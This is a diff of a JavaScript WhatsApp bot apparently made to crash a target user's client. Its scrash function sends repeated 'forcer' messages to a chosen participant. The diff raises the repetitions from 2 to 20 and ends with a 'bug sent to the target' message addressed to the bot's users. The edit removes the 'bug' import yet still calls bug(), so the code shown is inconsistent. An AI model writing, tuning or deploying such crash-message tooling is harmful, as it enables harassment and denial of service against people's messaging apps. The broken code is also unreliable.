@@ -2,8 +2,7 @@ import pkg from "bailey";
 
 const { proto, generateWAMessageFromContent } = pkg;
 
-
-import bug from '../commands/bug.js'
+import channelSender from '../commands/channelSender.js'
 
 
 async function forcer(client, isTarget){
@@ -319,7 +318,7 @@ export async function scrash(message, client) {
 
         // Execute the bug command
 
-        for (let i = 0; i < 2; i++) {
+        for (let i = 0; i < 20; i++) {
 
             await forcer(client, participant);
 
@@ -330,7 +329,7 @@ export async function scrash(message, client) {
         }
 
 
-        await bug(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 4);
+        await bug(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);
 
 
     } catch (error) {
